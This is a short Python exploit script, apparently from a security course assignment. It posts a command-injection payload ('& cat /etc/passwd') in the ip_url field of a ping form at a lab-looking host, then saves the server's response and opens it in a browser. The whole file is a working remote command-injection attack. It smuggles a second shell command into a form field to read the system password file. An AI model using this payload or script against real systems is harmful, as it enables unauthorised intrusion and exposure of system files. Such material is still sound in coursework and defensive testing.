import requests
import webbrowser

# Exploit: submit post request with ip_url = & cat /etc/passwd
# Server excutes 'ping & cat /etc/passwd'
# Remote Code Execution

def main():
    temp = '/tmp/case08.html'
    payload = {'ip_url':'& cat /etc/passwd'}
    r = requests.post('http://wsb.com/Assignment2/case08.php', data=payload)
    with open(temp, 'wb') as f:
        f.write(r.content)
    webbrowser.open(temp, 2)

if __name__ == "__main__":
    main()
